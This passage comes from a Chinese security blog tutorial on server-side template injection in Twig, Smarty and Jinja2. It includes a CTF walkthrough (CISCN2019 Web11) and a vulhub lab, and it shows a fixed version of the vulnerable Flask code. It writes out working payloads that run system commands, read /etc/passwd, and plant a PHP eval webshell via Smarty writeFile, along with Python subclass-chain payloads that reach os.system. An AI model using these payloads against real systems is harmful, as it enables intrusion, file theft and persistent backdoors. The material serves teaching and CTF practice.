phpinfo();&quot;:&quot;&#x2F;var&#x2F;www&#x2F;html&#x2F;shell.php&quot;&#125;|map(&quot;file_put_contents&quot;)&#125;&#125;</span><br><span class="line"></span><br><span class="line">&#123;&#123;[&quot;id&quot;,0]|sort(&quot;system&quot;)|join(&quot;,&quot;)&#125;&#125;</span><br><span class="line"></span><br><span class="line">&#123;&#123;[&quot;id&quot;]|filter(&quot;system&quot;)|join(&quot;,&quot;)&#125;&#125;</span><br><span class="line"></span><br><span class="line">&#123;&#123;[0,0]|reduce(&quot;system&quot;,&quot;id&quot;)|join(&quot;,&quot;)&#125;&#125;</span><br><span class="line"></span><br><span class="line">&#123;&#123;[&#39;cat &#x2F;etc&#x2F;passwd&#39;]|filter(&#39;system&#39;)&#125;&#125;</span><br></pre></td></tr></table></figure>

<p>具体payload分析详见：《<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/7518#toc-5">TWIG 全版本通用 SSTI payloads</a>》</p>
<p>　　　　　　　　　　 《<a target="_blank" rel="noopener" href="https://my.oschina.net/u/4588149/blog/4408349">SSTI-服务器端模板注入</a>》</p>
<h2 id="Smarty"><a href="#Smarty" class="headerlink" title="Smarty"></a>Smarty</h2><p>Smarty是最流行的PHP模板语言之一，为不受信任的模板执行提供了安全模式。这会强制执行在 php 安全函数白名单中的函数，因此我们在模板中无法直接调用 php 中直接执行命令的函数(相当于存在了一个disable_function)</p>
<p>但是，实际上对语言的限制并不能影响我们执行命令，因为我们首先考虑的应该是模板本身，恰好 Smarty 很照顾我们，在阅读<a target="_blank" rel="noopener" href="https://github.com/smarty-php/smarty">模板的文档</a>以后我们发现：$smarty内置变量可用于访问各种环境变量，比如我们使用 self 得到 smarty 这个类以后我们就去找 smarty 给我们的的方法</p>
<p>smarty/libs/sysplugins/smarty_internal_data.php　　——&gt;　　getStreamVariable() 这个方法可以获取传入变量的流</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">&#x2F;**</span><br><span class="line"> * gets  a stream variable</span><br><span class="line"> *</span><br><span class="line"> * @param  string $variable the stream of the variable</span><br><span class="line"> *</span><br><span class="line"> * @throws SmartyException</span><br><span class="line"> * @return mixed  the value of the stream variable</span><br><span class="line"> *&#x2F;</span><br><span class="line">public function getStreamVariable($variable)</span><br><span class="line">&#123;</span><br><span class="line">    $_result &#x3D; &#39;&#39;;</span><br><span class="line">    $fp &#x3D; fopen($variable, &#39;r+&#39;);</span><br><span class="line">    if ($fp) &#123;</span><br><span class="line">        while (!feof($fp) &amp;&amp; ($current_line &#x3D; fgets($fp)) !&#x3D;&#x3D; false) &#123;</span><br><span class="line">            $_result .&#x3D; $current_line;</span><br><span class="line">        &#125;</span><br><span class="line">        fclose($fp);</span><br><span class="line"></span><br><span class="line">        return $_result;</span><br><span class="line">    &#125;</span><br><span class="line">    $smarty &#x3D; isset($this-&gt;smarty) ? $this-&gt;smarty : $this;</span><br><span class="line">    if ($smarty-&gt;error_unassigned) &#123;</span><br><span class="line">        throw new SmartyException(&#39;Undefined stream variable &quot;&#39; . $variable . &#39;&quot;&#39;);</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        return null;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>因此我们可以用这个方法来读取文件</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;self::getStreamVariable(&quot;file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd&quot;)&#125;</span><br></pre></td></tr></table></figure>

<p>同样在</p>
<p>smarty/libs/sysplugins/smarty_internal_write_file.php　　——&gt;　　Smarty_Internal_Write_File 这个类中有一个writeFile方法</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">class Smarty_Internal_Write_File</span><br><span class="line">&#123;</span><br><span class="line">    &#x2F;**</span><br><span class="line">     * Writes file in a safe way to disk</span><br><span class="line">     *</span><br><span class="line">     * @param  string $_filepath complete filepath</span><br><span class="line">     * @param  string $_contents file content</span><br><span class="line">     * @param  Smarty $smarty    smarty instance</span><br><span class="line">     *</span><br><span class="line">     * @throws SmartyException</span><br><span class="line">     * @return boolean true</span><br><span class="line">     *&#x2F;</span><br><span class="line">    public function writeFile($_filepath, $_contents, Smarty $smarty)</span><br><span class="line">    &#123;</span><br><span class="line">        $_error_reporting &#x3D; error_reporting();</span><br><span class="line">        error_reporting($_error_reporting &amp; ~E_NOTICE &amp; ~E_WARNING);</span><br><span class="line">        if ($smarty-&gt;_file_perms !&#x3D;&#x3D; null) &#123;</span><br><span class="line">            $old_umask &#x3D; umask(0);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        $_dirpath &#x3D; dirname($_filepath);</span><br><span class="line">        &#x2F;&#x2F; if subdirs, create dir structure</span><br><span class="line">        if ($_dirpath !&#x3D;&#x3D; &#39;.&#39; &amp;&amp; !file_exists($_dirpath)) &#123;</span><br><span class="line">            mkdir($_dirpath, $smarty-&gt;_dir_perms &#x3D;&#x3D;&#x3D; null ? 0777 : $smarty-&gt;_dir_perms, true);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        &#x2F;&#x2F; write to tmp file, then move to overt file lock race condition</span><br><span class="line">        $_tmp_file &#x3D; $_dirpath . DS . str_replace(array(&#39;.&#39;, &#39;,&#39;), &#39;_&#39;, uniqid(&#39;wrt&#39;, true));</span><br><span class="line">        if (!file_put_contents($_tmp_file, $_contents)) &#123;</span><br><span class="line">            error_reporting($_error_reporting);</span><br><span class="line">            throw new SmartyException(&quot;unable to write file &#123;$_tmp_file&#125;&quot;);</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">        &#x2F;*</span><br><span class="line">         * Windows&#39; rename() fails if the destination exists,</span><br><span class="line">         * Linux&#39; rename() properly handles the overwrite.</span><br><span class="line">         * Simply unlink()ing a file might cause other processes</span><br><span class="line">         * currently reading that file to fail, but linux&#39; rename()</span><br><span class="line">         * seems to be smart enough to handle that for us.</span><br><span class="line">         *&#x2F;</span><br><span class="line">        if (Smarty::$_IS_WINDOWS) &#123;</span><br><span class="line">            &#x2F;&#x2F; remove original file</span><br><span class="line">            if (is_file($_filepath)) &#123;</span><br><span class="line">                @unlink($_filepath);</span><br><span class="line">            &#125;</span><br><span class="line">            &#x2F;&#x2F; rename tmp file</span><br><span class="line">            $success &#x3D; @rename($_tmp_file, $_filepath);</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            &#x2F;&#x2F; rename tmp file</span><br><span class="line">            $success &#x3D; @rename($_tmp_file, $_filepath);</span><br><span class="line">            if (!$success) &#123;</span><br><span class="line">                &#x2F;&#x2F; remove original file</span><br><span class="line">                if (is_file($_filepath)) &#123;</span><br><span class="line">                    @unlink($_filepath);</span><br><span class="line">                &#125;</span><br><span class="line">                &#x2F;&#x2F; rename tmp file</span><br><span class="line">                $success &#x3D; @rename($_tmp_file, $_filepath);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        if (!$success) &#123;</span><br><span class="line">            error_reporting($_error_reporting);</span><br><span class="line">            throw new SmartyException(&quot;unable to write file &#123;$_filepath&#125;&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">        if ($smarty-&gt;_file_perms !&#x3D;&#x3D; null) &#123;</span><br><span class="line">            &#x2F;&#x2F; set file permissions</span><br><span class="line">            chmod($_filepath, $smarty-&gt;_file_perms);</span><br><span class="line">            umask($old_umask);</span><br><span class="line">        &#125;</span><br><span class="line">        error_reporting($_error_reporting);</span><br><span class="line"></span><br><span class="line">        return true;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可以看到 writeFile 函数第三个参数一个 Smarty 类型，后来找到了 self::clearConfig()，函数原型：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">public function clearConfig($varname &#x3D; null)</span><br><span class="line">&#123;</span><br><span class="line">    return Smarty_Internal_Extension_Config::clearConfig($this, $varname);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>因此我们可以构造payload写个webshell</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,&quot;&lt;?php eval($_GET[&#39;cmd&#39;]); ?&gt;&quot;,self::clearConfig())&#125;</span><br></pre></td></tr></table></figure>

<h3 id="CTF实例讲解"><a href="#CTF实例讲解" class="headerlink" title="CTF实例讲解"></a>CTF实例讲解</h3><p>CTF地址：<a target="_blank" rel="noopener" href="https://buuoj.cn/challenges（CISCN2019华东南赛区Web11）">https://buuoj.cn/challenges（CISCN2019华东南赛区Web11）</a></p>
<p>题目模拟了一个获取IP的API，并且可以在最下方看到 “Build With Smarty !” 可以确定页面使用的是Smarty模板引擎。</p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20220208093133128.png" alt="image-20220208093133128"></p>
<p>在页面的右上角发现了IP，题目中提供的API均无法访问，猜测这个IP受到X-Forwarded-For头控制。</p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20220208093254678.png" alt="image-20220208093254678"></p>
<p>修改XXF头发现值发生变化</p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20220208094103720.png" alt="image-20220208094103720"></p>
<p>直接构造{system(‘cat /flag’)}即可得到flag</p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20220208094226601.png" alt="image-20220208094226601"></p>
<p>本题中引发SSTI的代码简化后如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    require_once(&#39;.&#x2F;smarty&#x2F;libs&#x2F;&#39; . &#39;Smarty.class.php&#39;);</span><br><span class="line">    $smarty &#x3D; new Smarty();</span><br><span class="line">    $ip &#x3D; $_SERVER[&#39;HTTP_X_FORWARDED_FOR&#39;];</span><br><span class="line">    $smarty-&gt;display(&quot;string:&quot;.$ip);     &#x2F;&#x2F; display函数把标签替换成对象的php变量；显示模板</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可以看到这里使用字符串代替smarty模板，导致了注入的Smarty标签被直接解析执行，产生了SSTI。</p>
<h3 id="Smarty-SSTI常规利用方式"><a href="#Smarty-SSTI常规利用方式" class="headerlink" title="Smarty-SSTI常规利用方式"></a>Smarty-SSTI常规利用方式</h3><h4 id="smarty-version"><a href="#smarty-version" class="headerlink" title="{$smarty.version}"></a>{$smarty.version}</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;$smarty.version&#125;    #获取smarty的版本号</span><br></pre></td></tr></table></figure>

<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20220208094843016.png" alt="image-20220208094843016"></p>
<h4 id="php-php"><a href="#php-php" class="headerlink" title="{php}{/php}"></a>{php}{/php}</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;php&#125;phpinfo();&#123;&#x2F;php&#125;  #执行相应的php代码</span><br></pre></td></tr></table></figure>

<p>Smarty支持使用 {php}{/php} 标签来执行被包裹其中的php指令，最常规的思路自然是先测试该标签。但就该题目而言，使用{php}{/php}标签会报错：</p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20220208095011038.png" alt="image-20220208095011038"></p>
<p>因为在Smarty3版本中已经废弃{php}标签，强烈建议不要使用。在Smarty 3.1，{php}仅在SmartyBC中可用</p>
<h4 id="literal"><a href="#literal" class="headerlink" title="{literal}"></a>{literal}</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;script language&#x3D;&quot;php&quot;&gt;phpinfo();&lt;&#x2F;script&gt;   </span><br></pre></td></tr></table></figure>

<p>这个地方借助了 {literal} 这个标签，因为 {literal} 可以让一个模板区域的字符原样输出。 这经常用于保护页面上的Javascript或css样式表，避免因为Smarty的定界符而错被解析。但是这种写法只适用于php5环境，这道ctf使用的是php7，所以依然失败</p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20220208095233169.png" alt="image-20220208095233169"></p>
<h4 id="getstreamvariable"><a href="#getstreamvariable" class="headerlink" title="getstreamvariable"></a>getstreamvariable</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;self::getStreamVariable(&quot;file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd&quot;)&#125;</span><br></pre></td></tr></table></figure>

<p>可以看到这个方法可以读取一个文件并返回其内容，所以我们可以用self来获取Smarty对象并调用这个方法。然而使用这个payload会触发报错如下：</p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20220208095627806.png" alt="image-20220208095627806"></p>
<p>可见这个旧版本Smarty的SSTI利用方式并不适用于新版本的Smarty。而且在3.1.30的Smarty版本中官方已经把该静态方法删除。 对于那些文章提到的利用 Smarty_Internal_Write_File 类的writeFile方法来写shell也由于同样的原因无法使用。</p>
<p>5.{if}{/if}</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;if phpinfo()&#125;&#123;&#x2F;if&#125;</span><br></pre></td></tr></table></figure>

<p>Smarty的 {if} 条件判断和PHP的if非常相似，只是增加了一些特性。每个{if}必须有一个配对的{/if}，也可以使用{else} 和 {elseif}，全部的PHP条件表达式和函数都可以在if内使用，如||<em>，or，&amp;&amp;，and，is_array()等等，如：{if is_array($array)}{/if}</em></p>
<p>既然这样就将XFF头改为 {if phpinfo()}{/if} ：</p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20220208095833547.png" alt="image-20220208095833547"></p>
<p>同样还能用来执行一些系统命令：</p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20220208095933513.png" alt="image-20220208095933513"></p>
<h2 id="Blade"><a href="#Blade" class="headerlink" title="Blade"></a>Blade</h2><p>Blade 是 Laravel 提供的一个既简单又强大的模板引擎。</p>
<p>关于blade模板这里不再多说，请参考《<a target="_blank" rel="noopener" href="https://www.cnblogs.com/sgm4231/p/10283661.html">laravel Blade 模板引擎</a>》</p>
<h1 id="Python中的SSTI"><a href="#Python中的SSTI" class="headerlink" title="Python中的SSTI"></a>Python中的SSTI</h1><p>python中常见的模版有: Jinja2, tornado</p>
<h2 id="Jinja2"><a href="#Jinja2" class="headerlink" title="Jinja2"></a>Jinja2</h2><p>Jinja2是一种面向Python的现代和设计友好的模板语言，它是以Django的模板为模型的</p>
<p>Jinja2是Flask框架的一部分。Jinja2会把模板参数提供的相应的值替换了  块</p>
<p>Jinja2使用 结构表示一个变量，它是一种特殊的占位符，告诉模版引擎这个位置的值从渲染模版时使用的数据中获取。</p>
<p>Jinja2 模板同样支持控制语句，像在 &#123;%…%&#125; 块中，下面举一个常见的使用Jinja2模板引擎for语句循环渲染一组元素的例子：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;ul&gt;</span><br><span class="line">     &#123;% for comment in comments %&#125;</span><br><span class="line">         &lt;li&gt;&#123;&#123;comment&#125;&#125;&lt;&#x2F;li&gt;</span><br><span class="line">     &#123;% endfor %&#125;</span><br><span class="line">&lt;&#x2F;ul&gt;</span><br></pre></td></tr></table></figure>

<p>另外Jinja2 能识别所有类型的变量，甚至是一些复杂的类型，例如列表、字典和对象。此外，还可使用过滤器修改变量，过滤器名添加在变量名之后，中间使用竖线分隔。例如，下述模板以首字母大写形式显示变量name的值。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Hello, &#123;&#123;name|capitalize&#125;&#125;</span><br></pre></td></tr></table></figure>

<p>我们使用vulhub提供的环境进行复现，搭建成功后访问首页如图</p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20220208181230660.png" alt="image-20220208181230660"></p>
<p>进入Docker容器来看一下对应的代码：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">from flask import Flask, request</span><br><span class="line">from jinja2 import Template</span><br><span class="line"></span><br><span class="line">app &#x3D; Flask(__name__)</span><br><span class="line"></span><br><span class="line">@app.route(&quot;&#x2F;&quot;)</span><br><span class="line">def index():</span><br><span class="line">    name &#x3D; request.args.get(&#39;name&#39;, &#39;guest&#39;)</span><br><span class="line"></span><br><span class="line">    t &#x3D; Template(&quot;Hello &quot; + name)</span><br><span class="line">    return t.render()</span><br><span class="line"></span><br><span class="line">if __name__ &#x3D;&#x3D; &quot;__main__&quot;:</span><br><span class="line">    app.run()</span><br></pre></td></tr></table></figure>

<p>t = Template(“hello” + name)这行代码表示，将前段输入的name拼接到模版，此时name的输入没有进过任何检测，尝试使用模版语言测试：</p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20220208181449567.png" alt="image-20220208181449567"></p>
<p>如果使用了一个固定好了的模版，在模版渲染之后传入数据，就不存在模板注入，就好像SQL注入的预编译一样，修复上面代码如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">from flask import Flask, request</span><br><span class="line">from jinja2 import Template</span><br><span class="line"></span><br><span class="line">app &#x3D; Flask(__name__)</span><br><span class="line"></span><br><span class="line">@app.route(&quot;&#x2F;&quot;)</span><br><span class="line">def index():</span><br><span class="line">    name &#x3D; request.args.get(&#39;name&#39;, &#39;guest&#39;)</span><br><span class="line"></span><br><span class="line">    t &#x3D; Template(&quot;Hello &#123;&#123;n&#125;&#125;&quot;)</span><br><span class="line">    return t.render(n&#x3D;name)</span><br><span class="line"></span><br><span class="line">if __name__ &#x3D;&#x3D; &quot;__main__&quot;:</span><br><span class="line">    app.run()</span><br></pre></td></tr></table></figure>

<p>编译运行，再次注入就会失败</p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20220208183412224.png" alt="image-20220208183412224"></p>
<p>由于在jinja2中是可以直接访问python的一些对象及其方法的，所以可以通过构造继承链来执行一些操作，比如文件读取，命令执行等：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">__dict__　　 ：保存类实例或对象实例的属性变量键值对字典</span><br><span class="line">__class__　　：返回一个实例所属的类</span><br><span class="line">__mro__　　  ：返回一个包含对象所继承的基类元组，方法在解析时按照元组的顺序解析。</span><br><span class="line">__bases__　　：以元组形式返回一个类直接所继承的类（可以理解为直接父类）__base__　　 ：和上面的bases大概相同，都是返回当前类所继承的类，即基类，区别是base返回单个，bases返回是元组</span><br><span class="line">&#x2F;&#x2F; __base__和__mro__都是用来寻找基类的</span><br><span class="line">__subclasses__　　：以列表返回类的子类</span><br><span class="line">__init__　　 ：类的初始化方法</span><br><span class="line">__globals__　　   ：对包含函数全局变量的字典的引用__builtin__&amp;&amp;__builtins__　　：python中可以直接运行一些函数，例如int()，list()等等。　　　　　　　　　　　　　　　　　　这些函数可以在__builtin__可以查到。查看的方法是dir(__builtins__)　　　　　　　　　　　　　　　　　　在py3中__builtin__被换成了builtin　　　　　　　　　　　　　　　　　　1.在主模块main中，__builtins__是对内建模块__builtin__本身的引用，即__builtins__完全等价于__builtin__。　　　　　　　　　　　　　　　　　　2.非主模块main中，__builtins__仅是对__builtin__.__dict__的引用，而非__builtin__本身</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="用file对象来读取文件"><a href="#用file对象来读取文件" class="headerlink" title="用file对象来读取文件"></a>用file对象来读取文件</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">for c in &#123;&#125;.__class__.__base__.__subclasses__():</span><br><span class="line">    if(c.__name__&#x3D;&#x3D;&#39;file&#39;):</span><br><span class="line">        print(c)</span><br><span class="line">        print c(&#39;ol4three.txt&#39;).readlines()</span><br></pre></td></tr></table></figure>

<p>运行结果</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">╰─$ python ssti.py</span><br><span class="line">&lt;type &#39;file&#39;&gt;</span><br><span class="line">[&#39;hello ol4three ~&#39;]</span><br></pre></td></tr></table></figure>

<p>上述代码先通过<strong>class</strong>获取字典对象所属的类，再通过<strong>base</strong>（<strong>bases[0]</strong>）拿到基类，然后使用<strong>subclasses</strong>()获取子类列表，在子类列表中直接寻找可以利用的类</p>
<p>为了方便理解，我直接把获取到的子类列表打印出来：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">for c in &#123;&#125;.__class__.__base__.__subclasses__():</span><br><span class="line">        print(c) </span><br></pre></td></tr></table></figure>

<p>打印结果如下（python2.7.18）</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;type &#39;type&#39;&gt;</span><br><span class="line">&lt;type &#39;weakref&#39;&gt;</span><br><span class="line">&lt;type &#39;weakcallableproxy&#39;&gt;</span><br><span class="line">&lt;type &#39;weakproxy&#39;&gt;</span><br><span class="line">&lt;type &#39;int&#39;&gt;</span><br><span class="line">&lt;type &#39;basestring&#39;&gt;</span><br><span class="line">&lt;type &#39;bytearray&#39;&gt;</span><br><span class="line">&lt;type &#39;list&#39;&gt;</span><br><span class="line">&lt;type &#39;NoneType&#39;&gt;</span><br><span class="line">&lt;type &#39;NotImplementedType&#39;&gt;</span><br><span class="line">&lt;type &#39;traceback&#39;&gt;</span><br><span class="line">&lt;type &#39;super&#39;&gt;</span><br><span class="line">&lt;type &#39;xrange&#39;&gt;</span><br><span class="line">&lt;type &#39;dict&#39;&gt;</span><br><span class="line">&lt;type &#39;set&#39;&gt;</span><br><span class="line">&lt;type &#39;slice&#39;&gt;</span><br><span class="line">&lt;type &#39;staticmethod&#39;&gt;</span><br><span class="line">&lt;type &#39;complex&#39;&gt;</span><br><span class="line">&lt;type &#39;float&#39;&gt;</span><br><span class="line">&lt;type &#39;buffer&#39;&gt;</span><br><span class="line">&lt;type &#39;long&#39;&gt;</span><br><span class="line">&lt;type &#39;frozenset&#39;&gt;</span><br><span class="line">&lt;type &#39;property&#39;&gt;</span><br><span class="line">&lt;type &#39;memoryview&#39;&gt;</span><br><span class="line">&lt;type &#39;tuple&#39;&gt;</span><br><span class="line">&lt;type &#39;enumerate&#39;&gt;</span><br><span class="line">&lt;type &#39;reversed&#39;&gt;</span><br><span class="line">&lt;type &#39;code&#39;&gt;</span><br><span class="line">&lt;type &#39;frame&#39;&gt;</span><br><span class="line">&lt;type &#39;builtin_function_or_method&#39;&gt;</span><br><span class="line">&lt;type &#39;instancemethod&#39;&gt;</span><br><span class="line">&lt;type &#39;function&#39;&gt;</span><br><span class="line">&lt;type &#39;classobj&#39;&gt;</span><br><span class="line">&lt;type &#39;dictproxy&#39;&gt;</span><br><span class="line">&lt;type &#39;generator&#39;&gt;</span><br><span class="line">&lt;type &#39;getset_descriptor&#39;&gt;</span><br><span class="line">&lt;type &#39;wrapper_descriptor&#39;&gt;</span><br><span class="line">&lt;type &#39;instance&#39;&gt;</span><br><span class="line">&lt;type &#39;ellipsis&#39;&gt;</span><br><span class="line">&lt;type &#39;member_descriptor&#39;&gt;</span><br><span class="line">&lt;type &#39;file&#39;&gt;</span><br><span class="line">&lt;type &#39;PyCapsule&#39;&gt;</span><br><span class="line">&lt;type &#39;cell&#39;&gt;</span><br><span class="line">&lt;type &#39;callable-iterator&#39;&gt;</span><br><span class="line">&lt;type &#39;iterator&#39;&gt;</span><br><span class="line">&lt;type &#39;sys.long_info&#39;&gt;</span><br><span class="line">&lt;type &#39;sys.float_info&#39;&gt;</span><br><span class="line">&lt;type &#39;EncodingMap&#39;&gt;</span><br><span class="line">&lt;type &#39;fieldnameiterator&#39;&gt;</span><br><span class="line">&lt;type &#39;formatteriterator&#39;&gt;</span><br><span class="line">&lt;type &#39;sys.version_info&#39;&gt;</span><br><span class="line">&lt;type &#39;sys.flags&#39;&gt;</span><br><span class="line">&lt;type &#39;exceptions.BaseException&#39;&gt;</span><br><span class="line">&lt;type &#39;module&#39;&gt;</span><br><span class="line">&lt;type &#39;imp.NullImporter&#39;&gt;</span><br><span class="line">&lt;type &#39;zipimport.zipimporter&#39;&gt;</span><br><span class="line">&lt;type &#39;posix.stat_result&#39;&gt;</span><br><span class="line">&lt;type &#39;posix.statvfs_result&#39;&gt;</span><br><span class="line">&lt;class &#39;warnings.WarningMessage&#39;&gt;</span><br><span class="line">&lt;class &#39;warnings.catch_warnings&#39;&gt;</span><br><span class="line">&lt;class &#39;_weakrefset._IterationGuard&#39;&gt;</span><br><span class="line">&lt;class &#39;_weakrefset.WeakSet&#39;&gt;</span><br><span class="line">&lt;class &#39;_abcoll.Hashable&#39;&gt;</span><br><span class="line">&lt;type &#39;classmethod&#39;&gt;</span><br><span class="line">&lt;class &#39;_abcoll.Iterable&#39;&gt;</span><br><span class="line">&lt;class &#39;_abcoll.Sized&#39;&gt;</span><br><span class="line">&lt;class &#39;_abcoll.Container&#39;&gt;</span><br><span class="line">&lt;class &#39;_abcoll.Callable&#39;&gt;</span><br><span class="line">&lt;type &#39;dict_keys&#39;&gt;</span><br><span class="line">&lt;type &#39;dict_items&#39;&gt;</span><br><span class="line">&lt;type &#39;dict_values&#39;&gt;</span><br><span class="line">&lt;class &#39;site._Printer&#39;&gt;</span><br><span class="line">&lt;class &#39;site._Helper&#39;&gt;</span><br><span class="line">&lt;type &#39;_sre.SRE_Pattern&#39;&gt;</span><br><span class="line">&lt;type &#39;_sre.SRE_Match&#39;&gt;</span><br><span class="line">&lt;type &#39;_sre.SRE_Scanner&#39;&gt;</span><br><span class="line">&lt;class &#39;site.Quitter&#39;&gt;</span><br><span class="line">&lt;class &#39;codecs.IncrementalEncoder&#39;&gt;</span><br><span class="line">&lt;class &#39;codecs.IncrementalDecoder&#39;&gt;</span><br></pre></td></tr></table></figure>

<p>使用dir来看一下file这个子类的内置方法：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">dir(().__class__.__bases__[0].__subclasses__()[40])</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[&#39;__class__&#39;, &#39;__delattr__&#39;, &#39;__doc__&#39;, &#39;__enter__&#39;, &#39;__exit__&#39;, &#39;__format__&#39;, &#39;__getattribute__&#39;, &#39;__hash__&#39;, &#39;__init__&#39;, &#39;__iter__&#39;, &#39;__new__&#39;, &#39;__reduce__&#39;, &#39;__reduce_ex__&#39;, &#39;__repr__&#39;, &#39;__setattr__&#39;, &#39;__sizeof__&#39;, &#39;__str__&#39;, &#39;__subclasshook__&#39;, &#39;close&#39;, &#39;closed&#39;, &#39;encoding&#39;, &#39;errors&#39;, &#39;fileno&#39;, &#39;flush&#39;, &#39;isatty&#39;, &#39;mode&#39;, &#39;name&#39;, &#39;newlines&#39;, &#39;next&#39;, &#39;read&#39;, &#39;readinto&#39;, &#39;readline&#39;, &#39;readlines&#39;, &#39;seek&#39;, &#39;softspace&#39;, &#39;tell&#39;, &#39;truncate&#39;, &#39;write&#39;, &#39;writelines&#39;, &#39;xreadlines&#39;]</span><br></pre></td></tr></table></figure>

<p>将读取的文件传入并使用readlines()方法读取，就相当于：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">file(&#39;ol4three.txt&#39;).readlines()</span><br></pre></td></tr></table></figure>

<p>我们在使用jinja2的语法封装成可解析的样子：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;</span><br><span class="line">&#123;% if c.__name__&#x3D;&#x3D;&#39;file&#39; %&#125;</span><br><span class="line">&#123;&#123; print(c(&quot;&#x2F;etc&#x2F;passwd&quot;).readlines()) &#125;&#125;</span><br><span class="line">&#123;% endif %&#125;</span><br><span class="line">&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20220209153255402.png" alt="image-20220209153255402"></p>
<p>会发现没有读取成功，原因是：<strong>python3已经移除了file。所以利用file子类文件读取只能在python2中用。</strong></p>
<p>docker容器默认使用python3版本我们使用python2在进行查看发现已经成功执行命令</p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20220209153646329.png" alt="image-20220209153646329"></p>
<h3 id="使用内置模块执行命令"><a href="#使用内置模块执行命令" class="headerlink" title="使用内置模块执行命令"></a>使用内置模块执行命令</h3><p>上面的实例中我们使用dir把内置的对象列举出来，其实可以用<strong>globals</strong>更深入的去看每个类可以调用的东西（包括模块，类，变量等等），如果有os这种可以直接传入命令，造成命令执行</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#coding:utf-8</span><br><span class="line">search &#x3D; &#39;os&#39;   #也可以是其他你想利用的模块</span><br><span class="line">num &#x3D; -1</span><br><span class="line">for i in ().__class__.__bases__[0].__subclasses__():</span><br><span class="line">    num +&#x3D; 1</span><br><span class="line">    try:</span><br><span class="line">        if search in i.__init__.__globals__.keys():</span><br><span class="line">            print(i, num)</span><br><span class="line">    except:</span><br><span class="line">        pass </span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">╰─$ python ssti.py</span><br><span class="line">(&lt;class &#39;site._Printer&#39;&gt;, 71)</span><br><span class="line">(&lt;class &#39;site.Quitter&#39;&gt;, 76)</span><br></pre></td></tr></table></figure>

<p>我们可以看到在元组68，73的位置找到了os方法，这样就可以构造命令执行payload:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">().__class__.__bases__[0].__subclasses__()[68].__init__.__globals__[&#39;os&#39;].system(&#39;whoami&#39;)</span><br><span class="line">().__class__.__base__.__subclasses__()[73].__init__.__globals__[&#39;os&#39;].system(&#39;whoami&#39;)</span><br><span class="line">().__class__.__mro__[1].__subclasses__()[68].__init__.__globals__[&#39;os&#39;].system(&#39;whoami&#39;)</span><br><span class="line">().__class__.__mro__[1].__subclasses__()[73].__init__.__globals__[&#39;os&#39;].system(&#39;whoami&#39;)</span><br></pre></td></tr></table></figure>

<p>不过同样，只能在python2版本中使用</p>
